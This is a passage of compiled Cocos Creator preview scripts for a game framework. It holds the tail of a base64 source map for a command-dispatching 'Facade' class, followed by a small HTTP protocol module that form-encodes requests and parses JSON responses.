SSxFQUFDO1lBQy9CLE9BQU8sQ0FBQyxLQUFLLENBQUMsOEVBQThFLENBQUMsQ0FBQztZQUM5RixPQUFPO1NBQ1Y7UUFDRCxJQUFJLElBQUksR0FBRyxFQUFFLENBQUMsV0FBVyxDQUFDLElBQUksQ0FBQyxpQkFBaUIsQ0FBQyxDQUFDO1FBQ2xELElBQUksQ0FBQyxTQUFTLENBQUMsSUFBSSxDQUFDLFVBQVUsQ0FBQyxDQUFDO1FBQ2hDLElBQUksQ0FBQyxRQUFRLEdBQUcsRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUM7UUFDNUIsSUFBSSxPQUFPLE9BQU8sSUFBSSxRQUFRLEVBQUM7WUFDM0IsSUFBSSxDQUFDLE9BQU8sR0FBRyxPQUFPLENBQUM7U0FDMUI7UUFDRCxJQUFJLENBQUMsTUFBTSxHQUFHLE1BQU0sQ0FBQztRQUVyQixJQUFJLFFBQVEsRUFBQztZQUNULElBQUksQ0FBQyxVQUFVLEdBQUcsUUFBUSxDQUFDO1NBQzlCO1FBQ0QsT0FBTyxJQUFJLENBQUM7SUFDaEIsQ0FBQztJQUlZLG1CQUFZLEdBQXpCLFVBQTBCLGtCQUF5Qjs7Ozs7O3dCQUMvQyxLQUFBLElBQUksQ0FBQTt3QkFBbUIscUJBQU0sRUFBRSxDQUFDLE1BQU0sQ0FBQyxZQUFZLENBQUMsa0JBQWtCLEVBQUUsRUFBRSxDQUFDLE1BQU0sQ0FBQyxFQUFBOzt3QkFBbEYsR0FBSyxlQUFlLEdBQUcsU0FBMkQsQ0FBQzs7Ozs7S0FDdEY7SUFFRCxXQUFXO0lBQ0UsZUFBUSxHQUFyQixVQUFzQixJQUFXLEVBQUUsUUFBaUIsRUFBRSxRQUFnQjs7Ozs7O3dCQUNsRSxJQUFJLElBQUksQ0FBQyxpQkFBaUIsSUFBSSxJQUFJLEVBQUM7NEJBQy9CLE9BQU8sQ0FBQyxLQUFLLENBQUMsNkRBQTZELENBQUMsQ0FBQzs0QkFDN0Usc0JBQU87eUJBQ1Y7d0JBQ0csSUFBSSxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsSUFBSSxDQUFDLGVBQWUsQ0FBQyxDQUFDO3dCQUNoRCxJQUFJLENBQUMsU0FBUyxDQUFDLE1BQU0sQ0FBQyxVQUFVLENBQUMsQ0FBQzt3QkFDbEMsSUFBSSxDQUFDLE1BQU0sR0FBRyxFQUFFLENBQUMsS0FBSyxDQUFDLFVBQVUsQ0FBQzt3QkFDbEMsSUFBSSxRQUFRLEVBQUM7NEJBQ1QsSUFBSSxDQUFDLFFBQVEsR0FBRyxRQUFRLENBQUM7eUJBQzVCOzZCQUFNOzRCQUNILElBQUksQ0FBQyxRQUFRLEdBQUcsRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUM7eUJBQy9CO3dCQUNHLFFBQVEsR0FBRyxJQUFJLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsQ0FBQzt3QkFDOUMsSUFBSSxRQUFRLEVBQUM7NEJBQ1QsUUFBUSxDQUFDLFFBQVEsR0FBRyxRQUFRLENBQUM7eUJBQ2hDO3dCQUNELFFBQVEsQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO3dCQUN2QixZQUFHLENBQUMsWUFBWSxDQUFDLFFBQVEsQ0FBQyxDQUFDO3dCQUMzQixxQkFBTSxJQUFJLENBQUMsY0FBYyxDQUFDLGlCQUFPLENBQUMsYUFBYSxFQUFFLENBQUMsRUFBQTs7d0JBQWxELFNBQWtELENBQUM7d0JBQ25ELElBQUksQ0FBQyxPQUFPLEVBQUUsQ0FBQzs7Ozs7S0FDbEI7SUExREQsaUJBQWlCO0lBQ1YsaUJBQVUsR0FBVyxJQUFJLENBQUM7SUFHbEIsd0JBQWlCLEdBQWEsSUFBSSxDQUFDO0lBMEJuQyxzQkFBZSxHQUFhLElBQUksQ0FBQztJQThCcEQsYUFBQztDQW5NRCxBQW1NQyxJQUFBO2tCQW5Nb0IsTUFBTSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuXHJcbmltcG9ydCB7SUNvbW1hbmR9IGZyb20gXCIuL0lDb21tYW5kXCI7XHJcbmltcG9ydCB7ZXh0fSBmcm9tIFwiLi4vZXh0ZW5kL0V4dGVuZFwiO1xyXG5pbXBvcnQgQWN0aW9ucyBmcm9tIFwiLi4vYWN0aW9ucy9BY3Rpb25zXCI7XHJcbmltcG9ydCB7SW50ZXJjZXB0b3J9IGZyb20gXCIuLi9pbnRlcmNlcHRvci9JbnRlcmNlcHRvclwiO1xyXG5cclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgRmFjYWRlIHtcclxuXHJcbiAgICBzdGF0aWMgZmluZENvbXBvbmVudDxUPihub2RlTmFtZTpzdHJpbmcsIHR5cGU6IHtwcm90b3R5cGU6IFR9IHwgc3RyaW5nLCByZWZlcmVuY2VOb2RlPzogY2MuTm9kZSk6IFQ7XHJcblxyXG4gICAgc3RhdGljICBmaW5kQ29tcG9uZW50KG5vZGVOYW1lOnN0cmluZywgdHlwZSwgcmVmZXJlbmNlTm9kZT86IGNjLk5vZGUpe1xyXG4gICAgICAgIHJlZmVyZW5jZU5vZGUgPSByZWZlcmVuY2VOb2RlIHx8IHRoaXMuY2FudmFzTm9kZTtcclxuICAgICAgICBsZXQgbm9kZSA9IGNjLmZpbmQobm9kZU5hbWUsIHJlZmVyZW5jZU5vZGUpO1xyXG4gICAgICAgIGlmIChub2RlKXtcclxuICAgICAgICAgICAgcmV0dXJuIG5vZGUuZ2V0Q29tcG9uZW50KHR5cGUpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgZXhlY3V0ZUNvbW1hbmQobmFtZTpzdHJpbmd8W3N0cmluZ10sIC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jIChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgaWYgKHR5cGVvZiBuYW1lID09IFwic3RyaW5nXCIpe1xyXG4gICAgICAgICAgICAgICAgbGV0IGFyciA9IG5hbWUuc3BsaXQoXCIsXCIpO1xyXG4gICAgICAgICAgICAgICAgbGV0IHJlc3VsdHMgPSBbXTtcclxuICAgICAgICAgICAgICAgIGZvciAobGV0IGkgaW4gYXJyKXtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgbmFtZSA9IGFycltpXS50cmltKCk7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGludGVyY2VwdG9ycyA9IEludGVyY2VwdG9yLmludGVyY2VwdG9yc09mKG5hbWUpO1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChpbnRlcmNlcHRvcnMubGVuZ3RoID4gMCl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBmbGFnID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXBBcnIgPSBpbnRlcmNlcHRvcnMuc2xpY2UoMCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICh0ZW1wQXJyLmxlbmd0aCA+IDApe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGNvbW1hbmRJbnRlcmNlcHRvciA9IHRlbXBBcnIuc2hpZnQoKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChDQ19ERUJVRyl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coYGV4ZWN1dGUgcHJlSGFuZGxlPT09PmNvbW1hbmROYW1lPSR7bmFtZX0gaW50ZXJjZXB0b3JOYW1lPSR7Y29tbWFuZEludGVyY2VwdG9yLmNvbnN0cnVjdG9yLm5hbWV9IGFyZ3M9JHthcmdzfWApO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZmxhZyA9IGF3YWl0IGNvbW1hbmRJbnRlcmNlcHRvci5wcmVIYW5kbGUoLi4uYXJncykuY2F0Y2gocmVhc29uID0+IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXJyO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgcmVhc29uID09IFwic3RyaW5nXCIpe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnIgPSBFcnJvcihyZWFzb24pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1lbHNlIGlmKHJlYXNvbiBpbnN0YW5jZW9mIEVycm9yKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyID0gcmVhc29uO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1lbHNle1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnIgPSBFcnJvcihgY29tbWFuZE5hbWU9JHtuYW1lfSAke2NvbW1hbmRJbnRlcmNlcHRvci5jb25zdHJ1Y3Rvci5uYW1lfS5wcmVIYW5kbGUoKWApO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWplY3QoZXJyKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pICYmIGZsYWc7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wQXJyID0gdGVtcEFyci5maWx0ZXIodmFsdWUgPT4gSW50ZXJjZXB0b3IuaW50ZXJjZXB0b3JzT2YobmFtZSkuc29tZSh2YWx1ZTIgPT4gdmFsdWUyID09IHZhbHVlKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFmbGFnKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICBpZiAoQ0NfREVCVUcpe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhgZXhlY3V0ZSBjb21tYW5kPT09PiR7bmFtZX0gYXJncz0ke2FyZ3N9YCk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIGxldCBjb21tYW5kID0gPElDb21tYW5kPihleHQuY3JlYXRlT2JqKG5hbWUpKTtcclxuICAgICAgICAgICAgICAgICAgICBpZighY29tbWFuZCl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlamVjdChFcnJvcihgY3JlYXRlT2JqKCR7bmFtZX0pPT09PiR7bmFtZX0gbm90IGZvdW5kYCkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIGxldCByZXMgPSBhd2FpdCBjb21tYW5kLmV4ZWN1dGUoLi4uYXJncykuY2F0Y2gocmVhc29uID0+IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGVycjtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHR5cGVvZiByZWFzb24gPT0gXCJzdHJpbmdcIil7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnIgPSBFcnJvcihyZWFzb24pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9ZWxzZSBpZihyZWFzb24gaW5zdGFuY2VvZiBFcnJvcil7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnIgPSByZWFzb247XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1lbHNle1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyID0gRXJyb3IoYGNvbW1hbmQuZXhlY3V0ZSgpPT09PmNvbW1hbmROYW1lPSR7bmFtZX1gKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICByZWplY3QoZXJyKTtcclxuICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICByZXN1bHRzLnB1c2gocmVzKTtcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgaW50ZXJjZXB0b3JzID0gSW50ZXJjZXB0b3IuaW50ZXJjZXB0b3JzT2YobmFtZSk7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGludGVyY2VwdG9ycy5sZW5ndGggPiAwKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXBBcnIgPSBpbnRlcmNlcHRvcnMuc2xpY2UoMCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICh0ZW1wQXJyLmxlbmd0aCA+IDApe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGNvbW1hbmRJbnRlcmNlcHRvciA9IHRlbXBBcnIuc2hpZnQoKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChDQ19ERUJVRyl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coYGV4ZWN1dGUgcG9zdEhhbmRsZT09PT5jb21tYW5kTmFtZT0ke25hbWV9IGludGVyY2VwdG9yTmFtZT0ke2NvbW1hbmRJbnRlcmNlcHRvci5jb25zdHJ1Y3Rvci5uYW1lfSByZXM9JHtyZXN9IGFyZ3M9JHthcmdzfWApO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgY29tbWFuZEludGVyY2VwdG9yLnBvc3RIYW5kbGUocmVzLCAuLi5hcmdzKS5jYXRjaChyZWFzb24gPT4ge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlcnI7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHR5cGVvZiByZWFzb24gPT0gXCJzdHJpbmdcIil7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVyciA9IEVycm9yKHJlYXNvbik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfWVsc2UgaWYocmVhc29uIGluc3RhbmNlb2YgRXJyb3Ipe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnIgPSByZWFzb247XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfWVsc2V7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVyciA9IEVycm9yKGBjb21tYW5kTmFtZT0ke25hbWV9ICR7Y29tbWFuZEludGVyY2VwdG9yLmNvbnN0cnVjdG9yLm5hbWV9LnBvc3RIYW5kbGVgKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVqZWN0KGVycik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBBcnIgPSB0ZW1wQXJyLmZpbHRlcih2YWx1ZSA9PiBJbnRlcmNlcHRvci5pbnRlcmNlcHRvcnNPZihuYW1lKS5zb21lKHZhbHVlMiA9PiB2YWx1ZTIgPT0gdmFsdWUpKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICByZXNvbHZlKHJlc3VsdHMpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9ZWxzZSBpZiAobmFtZSBpbnN0YW5jZW9mIEFycmF5KXtcclxuICAgICAgICAgICAgICAgIGxldCByZXN1bHRzID0gW107XHJcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBpIGluIG5hbWUpe1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCByZXMgPSBhd2FpdCBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQobmFtZVtpXSwgLi4uYXJncykuY2F0Y2gocmVhc29uID0+IHJlamVjdChyZWFzb24pKTtcclxuICAgICAgICAgICAgICAgICAgICByZXN1bHRzLnB1c2gocmVzKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIHJlc29sdmUocmVzdWx0cyk7XHJcbiAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgIHJlamVjdChFcnJvcihcImV4ZWN1dGVDb21tYW5kIHR5cGVvZihuYW1lKT09PT5cIit0eXBlb2YgbmFtZSkpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHN0YXRpYyByZWxlYXNlUHJlZmFiKHByZWZhYjpzdHJpbmcsIGV4Y2x1ZGVQcmVmYWI/OnN0cmluZ3xbc3RyaW5nXSl7XHJcbiAgICAgICAgbGV0IGV4Y2x1ZGVzID0gW107XHJcbiAgICAgICAgaWYgKGV4Y2x1ZGVQcmVmYWIpe1xyXG4gICAgICAgICAgICBpZiAodHlwZW9mIGV4Y2x1ZGVQcmVmYWIgPT0gXCJzdHJpbmdcIil7XHJcbiAgICAgICAgICAgICAgICBleGNsdWRlcy5wdXNoKGV4Y2x1ZGVQcmVmYWIpO1xyXG4gICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgZXhjbHVkZXMgPSBleGNsdWRlUHJlZmFiO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBpZiAoZXhjbHVkZXMuaW5kZXhPZihwcmVmYWIpID49IDApe1xyXG4gICAgICAgICAgICBjb25zb2xlLmxvZyhcInJlbGVhc2UgZmFpbCx0aGlzIHByZWZhYiBpbiByZXRhaW5QcmVmYWIgb3IgZXhjbHVkZXM9PT0+XCIrcHJlZmFiKTtcclxuICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBsZXQgZGVwcyA9IGNjLmxvYWRlci5nZXREZXBlbmRzUmVjdXJzaXZlbHkocHJlZmFiKTtcclxuICAgICAgICBsZXQgYXJyID0gZGVwcy5maWx0ZXIodmFsdWUgPT4ge1xyXG4gICAgICAgICAgICBmb3IgKGxldCBpIGluIGV4Y2x1ZGVzKXtcclxuICAgICAgICAgICAgICAgIGxldCByZXRhaW5QcmVmYWIgPSBleGNsdWRlc1tpXTtcclxuICAgICAgICAgICAgICAgIGlmKGNjLmxvYWRlci5nZXREZXBlbmRzUmVjdXJzaXZlbHkocmV0YWluUHJlZmFiKS5pbmRleE9mKHZhbHVlKSA+PSAwKXtcclxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgcmV0dXJuIHRydWU7XHJcbiAgICAgICAgfSk7XHJcbiAgICAgICAgYXJyLmZvckVhY2godmFsdWUgPT4ge1xyXG4gICAgICAgICAgICBjYy5sb2FkZXIucmVsZWFzZSh2YWx1ZSk7XHJcbiAgICAgICAgICAgIGNvbnNvbGUubG9nKHZhbHVlLCBcInJlbGVhc2U9PT09PlwiKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5b2T5YmNY2FudmFz6IqC54K5ICovXHJcbiAgICBzdGF0aWMgY2FudmFzTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcblxyXG4gICAgcHJpdmF0ZSBzdGF0aWMgX3NlcGFyYXRpb25QcmVmYWI6Y2MuUHJlZmFiID0gbnVsbDtcclxuXHJcbiAgICBzdGF0aWMgYXN5bmMgaW5pdFNlcGFyYXRpb25MYXllcihzZXBhcmF0aW9uUHJlZmFiTmFtZTpzdHJpbmcpe1xyXG4gICAgICAgIHRoaXMuX3NlcGFyYXRpb25QcmVmYWIgPSBhd2FpdCBjYy5sb2FkZXIubG9hZFJlc0F3YWl0KHNlcGFyYXRpb25QcmVmYWJOYW1lLCBjYy5QcmVmYWIpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKiDliqDlhaXpmpTmlq3lsYIgKi9cclxuICAgIHN0YXRpYyBhZGRTZXBhcmF0aW9uTGF5ZXIoZ3JvdXBJZHg6bnVtYmVyID0gbnVsbCwgb3BhY2l0eTpOdW1iZXIgPSAxMTUsIHpPcmRlcjpOdW1iZXIgPSAwKTpjYy5Ob2Rle1xyXG4gICAgICAgIGlmICh0aGlzLl9zZXBhcmF0aW9uUHJlZmFiID09IG51bGwpe1xyXG4gICAgICAgICAgICBjb25zb2xlLmVycm9yKFwicGxlYXNlIGNhbGwgRmFjYWRlLmluaXRTZXBhcmF0aW9uTGF5ZXIgYmVmb3JlIGNhbGwgRmFjYWRlLmFkZFNlcGFyYXRpb25MYXllclwiKTtcclxuICAgICAgICAgICAgcmV0dXJuO1xyXG4gICAgICAgIH1cclxuICAgICAgICBsZXQgbm9kZSA9IGNjLmluc3RhbnRpYXRlKHRoaXMuX3NlcGFyYXRpb25QcmVmYWIpO1xyXG4gICAgICAgIG5vZGUuc2V0UGFyZW50KHRoaXMuY2FudmFzTm9kZSk7XHJcbiAgICAgICAgbm9kZS5wb3NpdGlvbiA9IGNjLnYyKDAsIDApO1xyXG4gICAgICAgIGlmICh0eXBlb2Ygb3BhY2l0eSA9PSBcIm51bWJlclwiKXtcclxuICAgICAgICAgICAgbm9kZS5vcGFjaXR5ID0gb3BhY2l0eTtcclxuICAgICAgICB9XHJcbiAgICAgICAgbm9kZS56SW5kZXggPSB6T3JkZXI7XHJcblxyXG4gICAgICAgIGlmIChncm91cElkeCl7XHJcbiAgICAgICAgICAgIG5vZGUuZ3JvdXBJbmRleCA9IGdyb3VwSWR4O1xyXG4gICAgICAgIH1cclxuICAgICAgICByZXR1cm4gbm9kZTtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIHN0YXRpYyBfdGV4dFRpcHNQcmVmYWI6Y2MuUHJlZmFiID0gbnVsbDtcclxuXHJcbiAgICBzdGF0aWMgYXN5bmMgaW5pdFRleHRUaXBzKHRleHRUaXBzUHJlZmFiTmFtZTpzdHJpbmcpe1xyXG4gICAgICAgIHRoaXMuX3RleHRUaXBzUHJlZmFiID0gYXdhaXQgY2MubG9hZGVyLmxvYWRSZXNBd2FpdCh0ZXh0VGlwc1ByZWZhYk5hbWUsIGNjLlByZWZhYik7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOaWh+Wtl+aPkOekuiAqL1xyXG4gICAgc3RhdGljIGFzeW5jIHRleHRUaXBzKHRleHQ6c3RyaW5nLCBwb3NpdGlvbj86Y2MuVmVjMiwgZm9udFNpemU/Om51bWJlcil7XHJcbiAgICAgICAgaWYgKHRoaXMuX3NlcGFyYXRpb25QcmVmYWIgPT0gbnVsbCl7XHJcbiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoXCJwbGVhc2UgY2FsbCBGYWNhZGUuaW5pdFRleHRUaXBzIGJlZm9yZSBjYWxsIEZhY2FkZS50ZXh0VGlwc1wiKTtcclxuICAgICAgICAgICAgcmV0dXJuO1xyXG4gICAgICAgIH1cclxuICAgICAgICBsZXQgbm9kZSA9IGNjLmluc3RhbnRpYXRlKHRoaXMuX3RleHRUaXBzUHJlZmFiKTtcclxuICAgICAgICBub2RlLnNldFBhcmVudChGYWNhZGUuY2FudmFzTm9kZSk7XHJcbiAgICAgICAgbm9kZS56SW5kZXggPSBjYy5tYWNyby5NQVhfWklOREVYO1xyXG4gICAgICAgIGlmIChwb3NpdGlvbil7XHJcbiAgICAgICAgICAgIG5vZGUucG9zaXRpb24gPSBwb3NpdGlvbjtcclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICBub2RlLnBvc2l0aW9uID0gY2MudjIoMCwgMCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGxldCByaWNoVGV4dCA9IG5vZGUuZ2V0Q29tcG9uZW50KGNjLlJpY2hUZXh0KTtcclxuICAgICAgICBpZiAoZm9udFNpemUpe1xyXG4gICAgICAgICAgICByaWNoVGV4dC5mb250U2l6ZSA9IGZvbnRTaXplO1xyXG4gICAgICAgIH1cclxuICAgICAgICByaWNoVGV4dC5zdHJpbmcgPSB0ZXh0O1xyXG4gICAgICAgIGV4dC5zaG93UmljaFRleHQocmljaFRleHQpO1xyXG4gICAgICAgIGF3YWl0IG5vZGUucnVuQWN0aW9uQXdhaXQoQWN0aW9ucy5mbHV0dGVyQWN0aW9uKCkpO1xyXG4gICAgICAgIG5vZGUuZGVzdHJveSgpO1xyXG4gICAgfVxyXG5cclxufVxyXG5cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/http/HttpProtocol.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'ce99fMxrOJCPI2VBILKV/GL', 'HttpProtocol');
// framework/http/HttpProtocol.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var HttpProtocol = /** @class */ (function () {
    function HttpProtocol() {
        this.uri = null;
        this.request = {};
        this.response = null;
    }
    HttpProtocol.prototype.getResponseStatus = function () {
        return this.response.status;
    };
    HttpProtocol.prototype.getResponseData = function () {
        return this.response.data;
    };
    HttpProtocol.prototype.getResponseMessage = function () {
        return this.response.message;
    };
    HttpProtocol.prototype.encode = function () {
        console.log(">>>>发发发发发发===" + this.uri, this.request);
        var result = null;
        if (typeof FormData == "function") {
            var data = new FormData();
            for (var attr in this.request) {
                if (typeof this.request[attr] != "function") {
                    data.append(attr, this.request[attr]);
                }
            }
            result = data;
        }
        else {
            // 不支持FormData的浏览器的处理
            var arr = [];
            var i = 0;
            for (var attr in this.request) {
                if (typeof this.request[attr] != "function") {
                    arr[i] = encodeURIComponent(attr) + "=" + encodeURIComponent(this.request[attr]);
                    i++;
                }
            }
            result = arr.join("&");
        }
        return result;
    };
    HttpProtocol.prototype.decode = function (data) {
        this.response = JSON.parse(data);
        console.log("<<<<收收收收收收===" + this.uri, data);
        if (this.response.status != 0) {
            throw this.response;
        }
    };
    return HttpProtocol;
}());
exports.default = HttpProtocol;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
